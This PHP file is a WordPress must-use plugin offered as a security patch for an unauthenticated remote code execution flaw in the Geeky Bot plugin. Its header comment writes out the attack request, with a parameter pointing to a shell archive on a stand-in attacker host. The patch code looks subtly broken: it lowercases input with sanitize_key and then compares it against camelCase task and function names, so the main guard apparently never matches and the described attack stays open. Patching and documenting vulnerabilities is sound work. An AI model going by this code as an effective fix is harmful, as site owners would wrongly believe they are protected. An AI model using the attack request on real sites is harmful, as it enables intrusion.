<?php
/**
 * Plugin Name: Geeky Bot – Security Patch
 * Description: Patches unauthenticated RCE in Geeky Bot plugin <= 1.2.2.
 *              Place this file in wp-content/mu-plugins/.
 * Version:     1.0.0
 *
 * ──────────────────────────────────────────────────────────────────────────
 * VULNERABILITY SUMMARY
 * ──────────────────────────────────────────────────────────────────────────
 * Root cause  : wp_ajax_nopriv_geekybot_frontendajax exposes the task
 *               geekybotLoadMoreProducts (allow-listed) which performs a
 *               SECOND-LEVEL model/function dispatch using attacker-controlled
 *               POST parameters `modelName` and `functionName`.  The nonce
 *               check inside that function is commented out.
 *
 * Attack chain:
 *   POST admin-ajax.php
 *     action=geekybot_frontendajax
 *     task=geekybotLoadMoreProducts          <- in allow-list, no auth needed
 *     geekybotme=geekybot
 *     modelName=premiumplugin                <- attacker-controlled
 *     functionName=install_plugin            <- no current_user_can() check
 *     msg=http://attacker.com/shell.zip      <- attacker-controlled ZIP URL
 *   -> download_url($msg) + unzip_file() -> wp-content/plugins/  -> RCE
 *
 * PATCHES APPLIED
 * ──────────────────────────────────────────────────────────────────────────
 * P1  Intercept nopriv frontendajax before the plugin's handler and validate
 *     modelName/functionName against per-task whitelists.
 *
 * P2  Same guard on the logged-in frontendajax handler (defence-in-depth).
 *
 * P3  Block sensitive tasks via the formhandler init route for non-admins.
 *
 * P4  Block `install_plugin` / `downloadandinstalladdons` on the nopriv
 *     admin AJAX handler (geekybot_ajax) for non-admins, in case the plugin
 *     ever widens its allow-list.
 * ──────────────────────────────────────────────────────────────────────────
 */

defined( 'ABSPATH' ) || exit;

/* =========================================================================
 * Helpers
 * ========================================================================= */

/**
 * Return a raw (unsanitized) request value from POST or GET.
 * We intentionally avoid GEEKYBOT_getVar() here so the patch works
 * even before the plugin's request layer is bootstrapped.
 *
 * @param  string $key
 * @return string
 */
function _gbpatch_raw( string $key ): string {
    if ( isset( $_POST[ $key ] ) && is_string( $_POST[ $key ] ) ) {
        return $_POST[ $key ];
    }
    if ( isset( $_GET[ $key ] ) && is_string( $_GET[ $key ] ) ) {
        return $_GET[ $key ];
    }
    return '';
}

/**
 * Terminate with a 403 JSON error and log the blocked attempt.
 *
 * @param string $reason  Short description for the error log.
 */
function _gbpatch_block( string $reason ): void {
    // Optional: write to WP debug log so you can monitor blocked attempts.
    if ( defined( 'WP_DEBUG_LOG' ) && WP_DEBUG_LOG ) {
        error_log( sprintf(
            '[Geeky Bot Security Patch] Blocked request – %s | IP: %s | URI: %s | POST: %s',
            $reason,
            $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            $_SERVER['REQUEST_URI'] ?? '',
            wp_json_encode( array_map( 'sanitize_text_field', $_POST ) )
        ) );
    }

    if ( ! headers_sent() ) {
        status_header( 403 );
    }

    // wp_send_json_error() may not be loaded yet at priority-1 init time,
    // so we build the response manually to be safe.
    if ( function_exists( 'wp_send_json_error' ) ) {
        wp_send_json_error( [ 'message' => 'Request blocked by security policy.' ], 403 );
    } else {
        header( 'Content-Type: application/json; charset=utf-8' );
        echo wp_json_encode( [ 'success' => false, 'data' => [ 'message' => 'Request blocked by security policy.' ] ] );
    }
    exit;
}

/* =========================================================================
 * Whitelists
 * =========================================================================
 *
 * geekybotLoadMoreProducts  ->  only the woocommerce model should ever be
 *                               passed here; the function name must be one
 *                               of the known product-listing helpers.
 *
 * geekybotLoadMoreCustomPosts -> model is already hardcoded to systemaction
 *                               inside the plugin, but functionName is free;
 *                               restrict it to the known safe set.
 */
const GBPATCH_LOAD_MORE_PRODUCTS_ALLOWED_MODELS = [
    'woocommerce',
];

const GBPATCH_LOAD_MORE_PRODUCTS_ALLOWED_FUNCTIONS = [
    'geekybot_showAllProducts',
    'geekybot_searchProduct',
    'geekybot_getProductsUnderPrice',
    'geekybot_getProductsAbovePrice',
    'geekybot_getProductsBetweenPrice',
    'showProductsList',
    // Addon: woocommercepropack may add extra product listers —
    // add them here if you have that addon installed.
];

const GBPATCH_LOAD_MORE_CUSTOMPOSTS_ALLOWED_FUNCTIONS = [
    // systemaction functions that legitimately power "load more" for posts.
    // Extend this list if a custom addon registers additional safe handlers.
    'showArticlesList',
    'showCustomPostsList',
];

/**
 * Tasks that must never be reachable without manage_options,
 * regardless of which AJAX action or form-handler path triggered them.
 */
const GBPATCH_ADMIN_ONLY_TASKS = [
    'install_plugin',
    'downloadandinstalladdons',
    'downloadandinstalladdonfromAjax',
    'verifytransactionkey',
    'geekybotDownloadGoogleClientLibrary',
    'geekybotDownloadOpenAiAssistantLibrary',
    'geekybotCheckUpdates',
    'importZywrapData',
    'syncZywrapData',
    'sync_zywrap_delta',
    'importZywrapBatchProcess',
    'checkZywrapApiKey',
    'execute_zywrap_proxy',
    'get_wrappers_by_category',
    'geekybotCheckOpenRouterStatus',
    'geekybotCheckDialogflowStatus',
    'geekybotCheckOpenAIStatus',
];

/* =========================================================================
 * P1 + P2 – Frontend AJAX guard (nopriv + logged-in)
 * =========================================================================
 *
 * Priority 1 fires BEFORE the plugin's own handler (registered at default
 * priority 10), so we can exit() cleanly without the plugin code running.
 */

/**
 * Shared validation logic for both the nopriv and logged-in
 * geekybot_frontendajax handlers.
 */
function gbpatch_frontendajax_guard(): void {
    $task = sanitize_key( _gbpatch_raw( 'task' ) );

    // ── Guard: secondary model/function dispatch in geekybotLoadMoreProducts
    if ( $task === 'geekybotLoadMoreProducts' ) {
        $model_name    = sanitize_key( _gbpatch_raw( 'modelName' ) );
        $function_name = sanitize_key( _gbpatch_raw( 'functionName' ) );

        // If modelName is provided, it must be in the whitelist.
        if ( $model_name !== '' &&
             ! in_array( $model_name, GBPATCH_LOAD_MORE_PRODUCTS_ALLOWED_MODELS, true ) ) {
            _gbpatch_block( "geekybotLoadMoreProducts: disallowed modelName={$model_name}" );
        }

        // If functionName is provided, it must be in the whitelist.
        if ( $function_name !== '' &&
             ! in_array( $function_name, GBPATCH_LOAD_MORE_PRODUCTS_ALLOWED_FUNCTIONS, true ) ) {
            _gbpatch_block( "geekybotLoadMoreProducts: disallowed functionName={$function_name}" );
        }
    }

    // ── Guard: function dispatch in geekybotLoadMoreCustomPosts
    if ( $task === 'geekybotLoadMoreCustomPosts' ) {
        $function_name = sanitize_key( _gbpatch_raw( 'functionName' ) );

        if ( $function_name !== '' &&
             ! in_array( $function_name, GBPATCH_LOAD_MORE_CUSTOMPOSTS_ALLOWED_FUNCTIONS, true ) ) {
            _gbpatch_block( "geekybotLoadMoreCustomPosts: disallowed functionName={$function_name}" );
        }
    }

    // ── Guard: admin-only tasks must never reach the nopriv frontend handler
    if ( in_array( $task, GBPATCH_ADMIN_ONLY_TASKS, true ) &&
         ! current_user_can( 'manage_options' ) ) {
        _gbpatch_block( "frontendajax: admin-only task={$task} by unauthenticated user" );
    }
}

// P1 – nopriv (unauthenticated visitors)
add_action( 'wp_ajax_nopriv_geekybot_frontendajax', 'gbpatch_frontendajax_guard', 1 );

// P2 – logged-in users (defence-in-depth)
add_action( 'wp_ajax_geekybot_frontendajax', 'gbpatch_frontendajax_guard', 1 );

/* =========================================================================
 * P3 – Admin AJAX handler guard  (geekybot_ajax, both nopriv + logged-in)
 * =========================================================================
 *
 * The admin AJAX handler's allow-list includes downloadandinstalladdonfromAjax
 * and other sensitive tasks.  The plugin guards these with current_user_can()
 * inside each method, but we add a top-level check here as a safety net so
 * that even if a future allow-list change or copy-paste error removes an
 * inner check, the task is still blocked for non-admins.
 */
function gbpatch_adminajax_guard(): void {
    $task = sanitize_key( _gbpatch_raw( 'task' ) );

    if ( in_array( $task, GBPATCH_ADMIN_ONLY_TASKS, true ) &&
         ! current_user_can( 'manage_options' ) ) {
        _gbpatch_block( "geekybot_ajax: admin-only task={$task} by unauthenticated user" );
    }
}

add_action( 'wp_ajax_nopriv_geekybot_ajax', 'gbpatch_adminajax_guard', 1 );
add_action( 'wp_ajax_geekybot_ajax',        'gbpatch_adminajax_guard', 1 );

/* =========================================================================
 * P4 – formhandler init route guard
 * =========================================================================
 *
 * The GEEKYBOTformhandler runs on `init` and dispatches any `task` to a
 * controller with NO top-level capability check.  The individual controller
 * methods have their own checks, but install_plugin() in the controller does
 * NOT have one.  Block admin-only controller tasks here for non-admins.
 *
 * This hook runs at priority 1, before formhandler's own init hook (10).
 */
add_action( 'init', function (): void {
    // Only relevant for form-handler style requests.
    $form_request = isset( $_POST['form_request'] ) ? (string) $_POST['form_request'] : '';
    $action_get   = isset( $_GET['action'] )        ? (string) $_GET['action']        : '';

    if ( $form_request !== 'geekybot' && $action_get !== 'geekybottask' ) {
        return;
    }

    $task = sanitize_key( _gbpatch_raw( 'task' ) );

    if ( in_array( $task, GBPATCH_ADMIN_ONLY_TASKS, true ) &&
         ! current_user_can( 'manage_options' ) ) {
        wp_die(
            esc_html__( 'You do not have sufficient permissions to perform this action.', 'geeky-bot' ),
            403
        );
    }
}, 1 );
